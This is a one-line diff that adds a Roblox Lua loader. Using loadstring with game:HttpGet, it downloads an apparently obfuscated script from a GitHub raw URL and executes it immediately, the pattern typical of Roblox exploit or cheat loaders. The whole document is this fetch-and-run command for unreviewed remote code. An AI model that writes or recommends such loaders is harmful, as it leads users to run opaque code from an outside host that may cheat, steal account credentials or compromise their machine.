@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Eradate/Eradate/main/Protected_5572087694799455.lua.txt"))()
